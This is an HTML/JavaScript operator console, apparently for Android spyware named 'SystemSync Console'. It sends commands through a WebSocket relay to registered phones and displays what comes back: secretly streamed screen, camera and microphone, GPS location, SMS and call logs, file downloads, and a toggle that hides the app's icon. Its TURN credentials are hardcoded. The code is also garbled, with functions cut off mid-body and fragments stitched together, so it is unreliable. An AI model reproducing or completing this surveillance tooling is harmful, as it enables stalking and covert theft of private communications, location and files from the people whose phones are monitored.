<!DOCTYPE html>
<html>
<head>
    <title>SystemSync Console</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
    <style>
        /* ---------- CSS Variables for consistent theming ---------- */
        :root {
            --primary-color: #1976ff;
            --primary-dark: #0d5bca;
            --danger-color: #d32f2f;
            --danger-dark: #b71c1c;
            --success-color: #4caf50;
            --success-dark: #388e3c;
            --warning-color: #ff9800;
            --warning-dark: #f57c00;
            --incoming-color: #4caf50;
            --outgoing-color: #1976ff;
            --missed-color: #d32f2f;
            --text-primary: #1a2634;
            --text-secondary: #2c3e50;
            --text-muted: #7b8a9b;
            --bg-sidebar: #ffffff;
            --bg-main: #f5f7fa;
            --bg-panel: #ffffff;
            --border-color: #e0e4e8;
            --shadow-sm: 0 2px 8px rgba(0,0,0,0.05);
            --shadow-lg: 0 4px 20px rgba(0,0,0,0.1);
            
            --btn-height: 44px;
            --btn-padding: 12px;
            --btn-icon-size: 20px;
            --font-size-base: 14px;
            --font-size-small: 12px;
            --header-height: 60px; /* reduced from 70px */
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            margin: 0;
            background: var(--bg-main);
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
            display: flex;
            height: 100vh;
            overflow: hidden;
            color: var(--text-primary);
        }

        #sidebar {
            width: 280px;
            background: var(--bg-sidebar);
            border-right: 1px solid var(--border-color);
            padding: 20px;
            overflow-y: auto;
            box-shadow: var(--shadow-sm);
            transition: transform 0.3s ease;
            z-index: 1000;
        }

        @media (max-width: 768px) {
            body {
                flex-direction: column;
            }
            
            #sidebar {
                position: fixed;
                top: 0;
                left: 0;
                bottom: 0;
                transform: translateX(-100%);
                z-index: 2000;
                width: 85%;
                max-width: 320px;
                box-shadow: var(--shadow-lg);
            }
            
            #sidebar.show {
                transform: translateX(0);
            }
            
            .sidebar-overlay {
                display: none;
                position: fixed;
                top: 0;
                left: 0;
                right: 0;
                bottom: 0;
                background: rgba(0,0,0,0.5);
                z-index: 1500;
            }
            
            .sidebar-overlay.show {
                display: block;
            }
            
            #main {
                width: 100%;
                height: 100%;
            }
            
            #header {
                padding: 0 10px !important;
                height: 50px !important;
            }
            
            .header-left {
                gap: 8px;
            }
            
            .header-right {
                gap: 5px !important;
            }
            
            #deviceSelector {
                max-width: 130px;
                font-size: 12px;
                padding: 4px 8px;
                height: 36px;
            }
            
            .device-count {
                font-size: 10px;
                padding: 2px 5px;
            }
            
            .disconnect-btn {
                padding: 0 8px !important;
                height: 30px !important;
                font-size: 12px !important;
            }
            
            .reconnect-btn {
                padding: 0 8px !important;
                height: 30px !important;
                font-size: 12px !important;
            }
            
            #status {
                padding: 4px 8px !important;
                height: 30px !important;
                font-size: 12px !important;
            }
            
            #batteryInfo {
                padding: 2px 6px !important;
                height: 30px !important;
                font-size: 12px !important;
            }
            
            .battery-icon {
                width: 28px;
                height: 14px;
            }
            
            .battery-level {
                height: 10px;
            }
        }

        #header {
            height: var(--header-height);
            background: var(--bg-panel);
            border-bottom: 1px solid var(--border-color);
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 15px;
            font-weight: 600;
            color: var(--text-primary);
        }

        .header-left {
            display: flex;
            align-items: center;
            gap: 12px;
            flex-wrap: wrap;
        }

        .menu-btn {
            display: none;
            background: transparent;
            border: none;
            font-size: 24px;
            cursor: pointer;
            color: var(--text-primary);
            padding: 8px;
            width: auto;
            margin: 0;
        }

        @media (max-width: 768px) {
            .menu-btn {
                display: block;
                padding: 4px;
                font-size: 20px;
            }
        }

        .device-selector-container {
            display: flex;
            align-items: center;
            gap: 5px;
        }

        #deviceSelector {
            padding: 6px 10px;
            height: 38px;
            border-radius: 20px;
            border: 1px solid var(--border-color);
            background: white;
            font-size: var(--font-size-base);
            min-width: 180px;
            cursor: pointer;
        }

        .device-count {
            background: var(--primary-color);
            color: white;
            padding: 2px 8px;
            border-radius: 12px;
            font-size: var(--font-size-small);
            font-weight: 600;
            white-space: nowrap;
        }

        /* Small disconnect button */
        .disconnect-btn {
            background: var(--danger-color);
            color: white;
            border: none;
            border-radius: 16px;
            padding: 0 12px;
            height: 34px;
            font-size: 13px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 4px;
            white-space: nowrap;
            margin-left: 5px;
        }

        .disconnect-btn:hover {
            background: var(--danger-dark);
        }

        .header-right {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        #batteryInfo {
            display: none;
            align-items: center;
            gap: 6px;
            padding: 4px 10px;
            height: 38px;
            background: #f0f2f5;
            border-radius: 20px;
            font-size: var(--font-size-base);
        }

        .battery-icon {
            position: relative;
            width: 32px;
            height: 16px;
            border: 2px solid #555;
            border-radius: 3px;
            background: #fff;
        }

        .battery-level {
            position: absolute;
            top: 2px;
            left: 2px;
            height: 12px;
            background: #4caf50;
            border-radius: 2px;
        }

        .battery-icon.charging:after {
            content: "⚡";
            position: absolute;
            top: -10px;
            left: 8px;
            font-size: 16px;
        }

        .battery-percent {
            font-weight: 600;
            min-width: 40px;
        }

        #status {
            padding: 6px 12px;
            height: 38px;
            border-radius: 20px;
            background: #e8f0fe;
            color: var(--primary-color);
            font-weight: 500;
            cursor: pointer;
            display: flex;
            align-items: center;
            white-space: nowrap;
            font-size: 13px;
        }

        #status.offline {
            background: #ffebee;
            color: var(--danger-color);
        }

        .reconnect-btn {
            background: var(--primary-color);
            color: white;
            border: none;
            border-radius: 16px;
            padding: 0 12px;
            height: 34px;
            font-size: 13px;
            cursor: pointer;
            white-space: nowrap;
        }

        /* Device list page */
        #deviceListPage {
            padding: 20px;
        }
        .device-list-item {
            display: flex;
            align-items: center;
            padding: 15px;
            margin: 10px 0;
            background: white;
            border-radius: 12px;
            box-shadow: var(--shadow-sm);
            cursor: pointer;
            transition: all 0.2s;
            border: 1px solid var(--border-color);
        }
        .device-list-item:hover {
            background: #f0f7ff;
            border-color: var(--primary-color);
        }
        .device-list-icon {
            font-size: 32px;
            margin-right: 15px;
        }
        .device-list-info {
            flex: 1;
        }
        .device-list-name {
            font-size: 16px;
            font-weight: 600;
            color: var(--text-primary);
        }
        .device-list-details {
            font-size: 13px;
            color: var(--text-muted);
        }
        .device-list-lastseen {
            font-size: 12px;
            color: var(--text-muted);
        }

        /* ---------- rest of your existing CSS ---------- */

    </style>
</head>
<body>

<div id="sidebarOverlay" class="sidebar-overlay" onclick="toggleSidebar()"></div>

<div id="screenModalOverlay" class="modal-overlay">
    <div class="mobile-popup" id="mobilePopup">
        <div class="phone-frame">
            <div class="screen-container">
                <video id="modalScreenVideo" autoplay playsinline></video>
            </div>
        </div>
        <div class="popup-controls">
            <button id="modalSnapBtn" title="Snapshot">📸</button>
            <button id="modalRecordBtn" title="Record">🔴</button>
            <button id="modalFullscreenBtn" class="fullscreen-btn" title="Fullscreen">⛶</button>
            <button id="modalCloseBtn" class="close-btn" title="Close">✕</button>
        </div>
    </div>
</div>

<div id="sidebar">
    <div class="logo">SystemSync</div>

    <div class="section">
        <div class="section-title">Device</div>
        <button onclick="getInstalledApps()"><span>📱</span> <span>Installed Apps</span></button>
        <button onclick="showActivityTimeline()"><span>📜</span> <span>Activity Timeline</span></button>
    </div>

    <div class="section">
        <div class="section-title">Surveillance</div>
        <button id="screenShareBtn"><span>🖥</span> <span id="screenBtn">Start Screen</span></button>

        <button onclick="toggleCameraPanel('click')"><span>📷</span> <span>Click Picture</span></button>
        <div id="clickCameraPanel" class="camera-panel">
            <div class="camera-option">
                <label><input type="radio" name="clickCameraSelect" value="front" checked> Front</label>

            </div>
            <div class="camera-option" id="flashOption">
                <label><input type="checkbox" id="clickFlashCheckbox"> Use flash</label>
            </div>
            <button class="capture-btn" onclick="capturePicture()">TAKE A PICTURE</button>
        </div>

        <button onclick="toggleCameraPanel('live')"><span>📹</span> <span>See Live</span></button>
        <div id="liveCameraPanel" class="camera-panel">
            <div class="camera-option">
                <label><input type="radio" name="liveCameraSelect" value="front" checked> FrontCAM</label>
                <label><input type="radio" name="liveCameraSelect" value="back"> BackCAM</label>
            </div>
            <div class="camera-option">
                <label><input type="checkbox" id="liveMicCheckbox" checked> Use mic</label>
            </div>
            <button class="live-btn" onclick="startLiveStream()">See Live</button>
        </div>

        <button onclick="toggleLiveAudio()"><span>🎤</span> <span id="liveAudioBtn">Live Audio</span></button>
        <button onclick="stopLiveAudio()" style="display:none;" id="stopLiveAudioBtn"><span>⏹</span> <span>Stop Live Audio</span></button>

        <button onclick="sendCommand('GET_LOCATION')"><span>📍</span> <span>GPS Location</span></button>

    <div class="section">
        <div class="section-title">Data</div>

        <button onclick="sendCommand('GET_SMS', { box: 'inbox' })"><span>💬</span> <span>SMS Logs</span></button>

    <div class="section">
        <div class="section-title">Control</div>
        <button onclick="toggleAppIcon()"><span>👻</span> <span id="iconBtn">Hide Icon</span></button>
        <button onclick="sendCommand('VIBRATE', { duration: 1000 })"><span>📳</span> <span>Vibrate (1s)</span></button>
    </div>
</div>

<div id="main">
    <div id="header">
        <div class="header-left">
            <button class="menu-btn" onclick="toggleSidebar()">☰</button>
            <span>SystemSync Console</span>
            <div class="device-selector-container" id="deviceSelectorContainer" style="display: none;">
                <select id="deviceSelector" onchange="switchDevice(this.value)">

    </div>
    <div id="content">
        <div id="main-panel">
            <div id="deviceListPage" style="display: block;">
                <h2>👋 Select a Device</h2>
                <p>Choose a device from the list below to start controlling.</p>
                <div id="deviceListContainer"></div>
            </div>
            <div id="controlPanel" style="display: none;">
                <div id="welcomeMessage">
                    <h2>👋 Device Connected</h2>
                    <p>Click any button to send command.</p>
                </div>
            </div>

    </div>
</div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
<script>
    // ---------- GLOBALS ----------
    const WS_URL = "wss://mirror-view.onrender.com";
    let ws = null;

    let screenPC = null;
    let cameraPC = null;
    let audioPC = null;

    let mapInstance = null;
    let currentData = [];
    let currentPage = 0;
    let dataType = null;
    let currentPath = "root";
    let selectedFiles = [];
    let screenActive = false;
    let iconHidden = false;

    let mediaRecorder = null;
    let recordedChunks = [];

    let pendingCommand = null;

    let devices = new Map();
    let currentDeviceId = null;

    let currentBatteryLevel = 0;
    let currentBatteryStatus = 'unknown';

    // Audio recording variables
    let audioMediaRecorder = null;
    let audioRecordedChunks = [];

    // Screen recording variables
    let screenMediaRecorder = null;
    let screenRecordedChunks = [];

    // Activity timeline
    let activityTimeline = [];

    // Track pending file downloads
    let pendingDownloads = new Map();

    const panel = document.getElementById('main-panel');
    const statusEl = document.getElementById('status');
    const deviceListPage = document.getElementById('deviceListPage');
    const controlPanel = document.getElementById('controlPanel');
    const deviceSelectorContainer = document.getElementById('deviceSelectorContainer');
    const deviceSelector = document.getElementById('deviceSelector');
    const deviceCount = document.getElementById('deviceCount');
    const disconnectBtn = document.querySelector('.disconnect-btn');

    const modalOverlay = document.getElementById('screenModalOverlay');
    const modalVideo = document.getElementById('modalScreenVideo');
    const modalSnapBtn = document.getElementById('modalSnapBtn');
    const modalRecordBtn = document.getElementById('modalRecordBtn');
    const modalFullscreenBtn = document.getElementById('modalFullscreenBtn');
    const modalCloseBtn = document.getElementById('modalCloseBtn');

    // ---------- Helper Functions ----------
    function logActivity(action) {
        const time = new Date().toLocaleTimeString();
        activityTimeline.unshift({ time, action });
        if (activityTimeline.length > 100) activityTimeline.pop();
        console.log('Activity:', action);
    }

    function showActivityTimeline() {
        logActivity('Viewed activity timeline');
        let html = '<h3>📜 Activity Timeline</h3>';
        html += '<div style="max-height:500px;overflow:auto;">';

        if (activityTimeline.length === 0) {
            html += '<p style="padding:20px;text-align:center;color:#7b8a9b;">No activities recorded yet</p>';
        } else {
            activityTimeline.forEach(e => {
                html += `
                <div class="timeline-item">
                    <span class="timeline-action">${e.action}</span>
                    <span class="timeline-time">${e.time}</span>
                </div>`;
            });
        }

        html += '</div>';
        panel.innerHTML = html;
    }
    
    function getFormattedDateTime() {
        const d = new Date();
        const pad = (n) => n.toString().padStart(2, '0');
        return `${pad(d.getDate())}-${pad(d.getMonth()+1)}-${d.getFullYear()}-${pad(d.getHours())}-${pad(d.getMinutes())}-${pad(d.getSeconds())}`;
    }

    // FIXED: Format duration as MM:SS
    function formatDuration(seconds) {
        if (!seconds && seconds !== 0) return '00:00';
        const mins = Math.floor(seconds / 60);
        const secs = Math.floor(seconds % 60);
        return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
    }

    const ICE_SERVERS = [
        { urls: "stun:stun.l.google.com:19302" },
        { urls: "stun:stun1.l.google.com:19302" },
        { urls: "stun:stun2.l.google.com:19302" },
        { urls: "stun:stun3.l.google.com:19302" },
        { urls: "stun:stun4.l.google.com:19302" },
        { urls: "stun:stun.relay.metered.ca:80" },
        { urls: "turn:standard.relay.metered.ca:80", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
        { urls: "turn:standard.relay.metered.ca:80?transport=tcp", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
        { urls: "turn:standard.relay.metered.ca:443", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" },
        { urls: "turns:standard.relay.metered.ca:443?transport=tcp", username: "dc05b4f4ae8aaae1fff19747", credential: "OrIiLL1BH86B17iP" }
    ];

    function sendSignalingMessage(msg) {
        if (!ws || ws.readyState !== WebSocket.OPEN) {
            console.error('WebSocket not open');
            return;
        }
        const payload = {
            type: 'SIGNALING',
            data: msg
        };
        ws.send(JSON.stringify(payload));
        console.log('📤 Signaling sent:', msg.type, msg);
        logActivity(`Signaling: ${msg.type}`);
    }

    function createPeerConnection(streamType, onTrackCallback, useMic = false) {
        const pc = new RTCPeerConnection({ 
            iceServers: ICE_SERVERS,
            iceCandidatePoolSize: 10
        });

        if (streamType === 'screen') {
            pc.addTransceiver('video', { direction: 'recvonly' });
        } else if (streamType === 'camera') {
            pc.addTransceiver('video', { direction: 'recvonly' });
            if (useMic) {
                pc.addTransceiver('audio', { direction: 'recvonly' });
            }
        } else if (streamType === 'audio') {
            pc.addTransceiver('audio', { direction: 'recvonly' });
        }

        pc.ontrack = (e) => {
            console.log(`🎥 Track received for ${streamType}:`, e.streams);
            onTrackCallback(e);
        };

        pc.onicecandidate = (e) => {
            if (e.candidate) {
                console.log(`❄️ ICE candidate for ${streamType}:`, e.candidate);
                sendSignalingMessage({
                    type: 'ICE_CANDIDATE',
                    candidate: e.candidate,
                    streamType: streamType
                });
            }
        };

        pc.oniceconnectionstatechange = () => {
            console.log(`${streamType} ICE state:`, pc.iceConnectionState);
            if (pc.iceConnectionState === 'connected') {
                showNotification(`${streamType} connected`);
                logActivity(`${streamType} connected`);
            } else if (pc.iceConnectionState === 'disconnected' || pc.iceConnectionState === 'failed') {
                if (streamType === 'screen') {
                    screenActive = false;
                    document.getElementById('screenBtn').innerText = 'Start Screen';
                    closeScreenModal();
                    logActivity('Screen share disconnected');
                    showNotification('Screen share disconnected');
                } else if (streamType === 'audio') {
                    stopLiveAudio();
                } else if (streamType === 'camera') {
                    logActivity('Camera stream disconnected');
                }
            }
        };

        pc.onconnectionstatechange = () => {
            console.log(`${streamType} connection state:`, pc.connectionState);
        };

        return pc;
    }

    function getPCForType(type) {
        if (type === 'screen') return screenPC;
        if (type === 'camera') return cameraPC;
        if (type === 'audio') return audioPC;
        return null;
    }

    function handleSignalingMessage(msg) {
        console.log('Received signaling:', msg);
        
        if (msg.type === 'ANSWER') {
            const pc = getPCForType(msg.streamType);
            if (pc) {
                console.log(`Setting remote answer for ${msg.streamType}`);
                const answer = new RTCSessionDescription({ type: 'answer', sdp: msg.sdp });
                pc.setRemoteDescription(answer)
                    .then(() => console.log('Remote description set successfully'))
                    .catch(e => console.error('Error setting remote description:', e));
            }
        } else if (msg.type === 'ICE_CANDIDATE') {
            const pc = getPCForType(msg.streamType);
            if (pc && msg.candidate) {
                console.log(`Adding ICE candidate for ${msg.streamType}`);
                pc.addIceCandidate(new RTCIceCandidate(msg.candidate))
                    .then(() => console.log('ICE candidate added successfully'))
                    .catch(e => console.error('Error adding ICE candidate:', e));
            }
        }
    }

    function openScreenModal() {
        modalOverlay.classList.add('show');
        document.body.classList.add('modal-open');
        modalRecordBtn.innerText = '🔴';
        if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
            screenMediaRecorder.stop();
        }
        screenMediaRecorder = null;
        screenRecordedChunks = [];
    }

    function closeScreenModal() {
        if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
            screenMediaRecorder.stop();
        }
        modalOverlay.classList.remove('show');
        document.body.classList.remove('modal-open');
        modalRecordBtn.innerText = '🔴';
        // Ensure screen share is stopped if active
        if (screenActive) {
            // Call toggleScreen to stop it properly
            toggleScreen();
        }
    }

    async function toggleScreen() {
        if (!currentDeviceId) {
            alert('Please select a device first');
            return;
        }

        if (screenActive) {
            if (screenPC) {
                screenPC.close();
                screenPC = null;
            }
            document.getElementById('screenBtn').innerText = 'Start Screen';
            screenActive = false;
            closeScreenModal();
            sendSignalingMessage({ type: 'STOP_SCREEN' });
            logActivity('Stopped screen share');
            showNotification('Screen share stopped');
        } else {
            openScreenModal();
            modalVideo.srcObject = null;

            console.log('Creating screen peer connection...');
            screenPC = createPeerConnection('screen', (e) => {
                console.log('🎬 Screen track received:', e.streams);
                if (e.streams && e.streams[0]) {
                    modalVideo.srcObject = e.streams[0];
                    modalVideo.play().catch(err => console.error('Error playing video:', err));
                    showNotification('Screen share connected');
                    logActivity('Screen share connected');
                }
            }, false);

            try {
                console.log('Creating offer...');
                const offer = await screenPC.createOffer({
                    offerToReceiveVideo: true,
                    offerToReceiveAudio: false
                });
                console.log('Offer created:', offer);
                
                await screenPC.setLocalDescription(offer);
                console.log('Local description set');
                
                sendSignalingMessage({

    function toggleScreenRecording() {
        if (screenMediaRecorder && screenMediaRecorder.state === 'recording') {
            screenMediaRecorder.stop();
            modalRecordBtn.innerText = '🔴';
            logActivity('Screen recording stopped');
        } else {
            if (!modalVideo.srcObject) {
                alert('No active screen share');
                return;
            }
            screenRecordedChunks = [];
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            const stream = modalVideo.srcObject;

            if (modalVideo.videoWidth === 0) {
                modalVideo.onloadedmetadata = () => startScreenRecording(canvas, ctx, stream);
            } else {
                startScreenRecording(canvas, ctx, stream);
            }
            logActivity('Screen recording started');
        }
    }

    function startScreenRecording(canvas, ctx, originalStream) {
        canvas.width = modalVideo.videoWidth;
        canvas.height = modalVideo.videoHeight;

        function drawVideoFrame() {
            if (modalVideo.readyState === modalVideo.HAVE_ENOUGH_DATA) {
                ctx.drawImage(modalVideo, 0, 0, canvas.width, canvas.height);
            }
            requestAnimationFrame(drawVideoFrame);
        }
        drawVideoFrame();

        const canvasStream = canvas.captureStream(30);
        originalStream.getAudioTracks().forEach(track => canvasStream.addTrack(track));

        screenMediaRecorder = new MediaRecorder(canvasStream, { mimeType: 'video/webm' });
        screenMediaRecorder.ondataavailable = (e) => {
            if (e.data.size > 0) screenRecordedChunks.push(e.data);
        };
        screenMediaRecorder.onstop = () => {
            const blob = new Blob(screenRecordedChunks, { type: 'video/webm' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `screenVideo-${getFormattedDateTime()}.webm`;
            a.click();
            URL.revokeObjectURL(url);
            canvasStream.getTracks().forEach(track => track.stop());
            logActivity('Screen recording saved');
        };
        screenMediaRecorder.start();
        modalRecordBtn.innerText = '🟢';
    }

        }
    }

    function sendCommand(command, params = {}) {
        if (!currentDeviceId) {
            panel.innerHTML = `<div style="color:#d32f2f;">⚠ Please select a device first</div>`;
            return;
        }

        if (!ws || ws.readyState !== WebSocket.OPEN) {
            panel.innerHTML = `<div style="color:#d32f2f;">⚠ WebSocket not connected. Click reconnect.</div>`;
            return;
        }

        const requestId = 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
        const payload = {
            type: 'COMMAND',
            command: command,
            requestId: requestId,
            deviceId: currentDeviceId,
            params: params,
            timestamp: Date.now()
        };
        ws.send(JSON.stringify(payload));
        panel.innerHTML = `📤 Command sent to ${devices.get(currentDeviceId)?.name || 'device'}: ${command}`;
        pendingCommand = command;
        logActivity(`Command sent: ${command}`);
        
        // Store for file downloads
        if (command === 'LIST_FILES') {
            currentPath = params.path || 'root';
        }
        
        setTimeout(() => { if (pendingCommand === command) pendingCommand = null; }, 10000);
    }

        if (!currentDeviceId) {

            panel.innerHTML = `<div style="color:#d32f2f;">⚠ WebSocket not connected. Click reconnect.</div>`;
            return;
        }

        ws.send(msg);
        panel.innerHTML = `📤 Plain text sent: ${msg}`;
        logActivity(`Plain text: ${msg}`);
    }

        html += '</tr></thead><tbody>';

        currentData.forEach(c => {
            const type = (c.type || '').toLowerCase();
            let typeClass = 'call-unknown';
            let typeBadge = 'Unknown';
            let typeIcon = '❓';

            if (type.includes('incoming') || type === 'incoming' || type === '1') {
                typeClass = 'call-incoming';
                typeBadge = 'Incoming';
                typeIcon = '📥';
            } else if (type.includes('outgoing') || type === 'outgoing' || type === '2') {
                typeClass = 'call-outgoing';
                typeBadge = 'Outgoing';
                typeIcon = '📤';
            } else if (type.includes('missed') || type === 'missed' || type === '3') {
                typeClass = 'call-missed';
                typeBadge = 'Missed';
                typeIcon = '❌';
            } else if (type.includes('rejected') || type === 'rejected' || type === '5') {
                typeClass = 'call-rejected';
                typeBadge = 'Rejected';
                typeIcon = '🚫';
            }

            const contact = c.name || c.contact || '';
            const number = c.number || c.address || '';
            const duration = formatDuration(c.duration || 0);
            
            html += `
            <tr class="${typeClass}">
                <td><span class="call-type-badge ${typeClass.replace('call-', 'call-type-')}">${typeIcon} ${typeBadge}</span></td>

        let parts = currentPath.split('/');

        if (parent === '') parent = 'root';
        currentPath = parent;
        sendCommand('LIST_FILES', { path: parent });

        const path = checkbox.dataset.path;
        if (checkbox.checked) {
            if (!selectedFiles.includes(path)) selectedFiles.push(path);
        } else {
            selectedFiles = selectedFiles.filter(p => p !== path);
        }
        const downloadBtn = document.querySelector('.download-selected button');
        if (downloadBtn) {
            downloadBtn.innerText = `Download Selected (${selectedFiles.length})`;

    function downloadSelected() {
        if (selectedFiles.length === 0) {
            alert('No files selected');
            return;

        selectedFiles.forEach(path => {
            sendPlainText('dl ' + path);
        });
        logActivity(`Downloading ${selectedFiles.length} files`);
        showNotification(`Downloading ${selectedFiles.length} files...`);
    }

    function formatBytes(b) {
        if (b === 0) return '0 B';
        const k = 1024, sizes = ['B','KB','MB','GB'];
        const i = Math.floor(Math.log(b)/Math.log(k));
        return (b/Math.pow(k,i)).toFixed(1) + ' ' + sizes[i];
    }

    function showNotification(text) {
        const orig = statusEl.innerText;
        statusEl.innerText = text;
        setTimeout(() => { statusEl.innerText = orig; }, 2000);

    function handleIncomingMessage(msg) {
        try {
            const json = JSON.parse(msg);
            if (json.type === 'SIGNALING') {
                handleSignalingMessage(json.data);
            } else {
                handleJSON(json);
            }
        } catch (e) {
            handlePlainText(msg);
        }
    }

    function handleJSON(json) {
        console.log('handleJSON:', json.type, json);

        if (json.deviceId && json.deviceId !== currentDeviceId) {
            console.log('Message from non-selected device:', json.deviceId);
            if (!devices.has(json.deviceId)) {
                handleDeviceRegistration({
                    deviceId: json.deviceId,
                    name: json.deviceName || 'Unknown Device'
                });
            }
            return;
        }

        switch (json.type) {
            case 'DEVICE_REGISTRATION':
                handleDeviceRegistration(json);
                break;

            case 'DEVICE_LIST':
                devices.clear();
                if (Array.isArray(json.devices)) {
                    json.devices.forEach(device => {
                        devices.set(device.deviceId, device);
                    });
                }
                updateDeviceSelector();
                updateDeviceList();
                if (!currentDeviceId && devices.size > 0) {
                    deviceListPage.style.display = 'block';
                    controlPanel.style.display = 'none';
                    deviceSelectorContainer.style.display = 'none';
                    disconnectBtn.style.display = 'none';
                }
                break;

            case 'DEVICE_INFO':
                setStatus('ONLINE');
                logActivity('Device paired: ' + (json.model || json.manufacturer || 'unknown'));
                if (json.batteryLevel !== undefined) {
                    updateBatteryInfo(json.batteryLevel, json.batteryCharging || false);
                }
                break;

            case 'INSTALLED_APPS':
                displayInstalledApps(json.data);
                break;

            case 'FILE_DELETED':
                showNotification('File deleted');
                sendCommand('LIST_FILES', { path: currentPath });
                logActivity('File deleted confirmed');
                break;

            case 'DEVICE_REGISTERED':
                showNotification('Device registered successfully');
                break;

            case 'SMS_DATA':
                dataType = 'sms';
                currentData = parseDataField(json.data);
                renderSMS();
                logActivity('SMS data received');
                break;

            case 'CALL_LOGS':
                dataType = 'call';
                currentData = parseDataField(json.data);
                renderCallLogs();
                logActivity('Call logs received');
                break;

            case 'FILE_LIST':
                dataType = 'file';
                currentData = parseDataField(json.data);
                renderFiles();
                logActivity('File list received');
                break;

            case 'LOCATION_UPDATE':
                renderMap(parseDataField(json.data));
                logActivity('Location update received');
                break;

            case 'CAMERA_IMAGE':
                displayCapturedImage(json.data);
                logActivity('Camera image received');
                break;

            case 'AUDIO_RECORDING':
                showAudio(json.data);
                logActivity('Audio recording received');
                break;

            case 'ERROR':
                panel.innerHTML = `<div style="color:#d32f2f;">Error: ${json.error}</div>`;
                logActivity(`Error: ${json.error}`);
                break;

            case 'APP_HIDDEN':
                iconHidden = true;
                document.getElementById('iconBtn').innerText = 'Show Icon';
                showNotification('App icon hidden');
                logActivity('App icon hidden');
                break;

            case 'APP_SHOWN':
                iconHidden = false;
                document.getElementById('iconBtn').innerText = 'Hide Icon';
                showNotification('App icon shown');
                logActivity('App icon shown');
                break;

            case 'SCREEN_SHARE_STARTED':
                screenActive = true;
                document.getElementById('screenBtn').innerText = 'Stop Screen';
                showNotification('Screen share started (device)');
                logActivity('Screen share started (device)');
                break;

            case 'SCREEN_SHARE_STOPPED':
                screenActive = false;
                document.getElementById('screenBtn').innerText = 'Start Screen';
                if (screenPC) { 
                    screenPC.close(); 
                    screenPC = null; 
                }
                closeScreenModal();
                showNotification('Screen share stopped (device)');
                logActivity('Screen share stopped (device)');
                break;

            default:
                console.log('Unhandled JSON type:', json.type);
                if (pendingCommand === 'LIST_FILES' && Array.isArray(json)) {
                    dataType = 'file';
                    currentData = json;
                    renderFiles();
                } else if (pendingCommand === 'GET_SMS' && Array.isArray(json)) {
                    dataType = 'sms';
                    currentData = json;
                    renderSMS();
                } else if (pendingCommand === 'GET_CALL_LOGS' && Array.isArray(json)) {
                    dataType = 'call';
                    currentData = json;
                    renderCallLogs();
                } else if (pendingCommand === 'GET_LOCATION' && json.lat && json.lon) {
                    renderMap(json);
                }
                break;
        }

        pendingCommand = null;
    }

    function handlePlainText(msg) {
        if (msg.startsWith("dl ")) {
            console.log('Download request:', msg);
            return;
        }
        
        if (msg.startsWith("STATUS:")) {
            setStatus(msg.substring(7));
        } else if (msg.startsWith("LOC_DATA:")) {
            try {
                const data = JSON.parse(msg.substring(9));
                renderMap(data);
            } catch (err) { console.error(err); }
        } else if (msg.startsWith("FILE_LIST:")) {
            try {
                const dataStr = msg.substring(10);
                currentData = JSON.parse(dataStr);
                dataType = 'file';
                renderFiles();
                logActivity('File list received');
            } catch (err) { console.error(err); }
        } else if (msg.startsWith("SMS_DATA:")) {
            try {
                const dataStr = msg.substring(9);
                currentData = JSON.parse(dataStr);
                dataType = 'sms';
                renderSMS();
                logActivity('SMS data received');
            } catch (err) { console.error(err); }
        } else if (msg.startsWith("CALL_DATA:")) {
            try {
                const dataStr = msg.substring(10);
                currentData = JSON.parse(dataStr);
                dataType = 'call';
                renderCallLogs();
                logActivity('Call logs received');
            } catch (err) { console.error(err); }
        } else if (msg.startsWith("CAMERA_IMAGE:")) {
            const base64 = msg.substring(13);
            displayCapturedImage(base64);
        } else if (msg.startsWith("AUDIO_RECORDING:")) {
            showAudio(msg.substring(16));
        } else if (msg.startsWith("FILE_DATA:")) {
            const base64 = msg.substring(10);
            const filename = 'downloaded_file_' + Date.now() + '.bin';
            downloadBase64(base64, filename);
            showNotification('File downloaded: ' + filename);
            logActivity('File downloaded');
        } else if (msg.startsWith("SCREEN_SHARE_STARTED")) {
            screenActive = true;
            document.getElementById('screenBtn').innerText = 'Stop Screen';
            showNotification('Screen share started');
            logActivity('Screen share started (plain)');
        } else if (msg.startsWith("SCREEN_SHARE_STOPPED")) {
            screenActive = false;
            document.getElementById('screenBtn').innerText = 'Start Screen';
            if (screenPC) { 
                screenPC.close(); 
                screenPC = null; 
            }
            closeScreenModal();
            showNotification('Screen share stopped');
            logActivity('Screen share stopped (plain)');
        } else if (msg.startsWith("APP_HIDDEN")) {
            iconHidden = true;
            document.getElementById('iconBtn').innerText = 'Show Icon';
            showNotification('App icon hidden');
        } else if (msg.startsWith("APP_SHOWN")) {
            iconHidden = false;
            document.getElementById('iconBtn').innerText = 'Hide Icon';
            showNotification('App icon shown');
        } else if (msg.startsWith("VIBRATE_DONE")) {
            showNotification('Vibration done');
        } else if (msg.startsWith("ERROR:")) {
            panel.innerHTML = `<div style="color:#d32f2f;">Error: ${msg.substring(6)}</div>`;
        } else if (msg.startsWith('[') || msg.startsWith('{')) {
            try {
                const parsed = JSON.parse(msg);
                handleJSON(parsed);
            } catch (err) {
                console.error('Failed to parse JSON in plain text:', err);
            }
        } else {
            console.log('Unhandled plain text:', msg);
        }
    }

    function setStatus(s) {
        statusEl.innerText = s;
        statusEl.classList.remove('offline');
        if (s === 'ONLINE') {
            statusEl.style.background = '#e8f5e9';
            statusEl.style.color = '#2e7d32';
        } else if (s === 'CONNECTED') {
            statusEl.style.background = '#fff8e1';
            statusEl.style.color = '#f57f17';
        } else {
            statusEl.classList.add('offline');
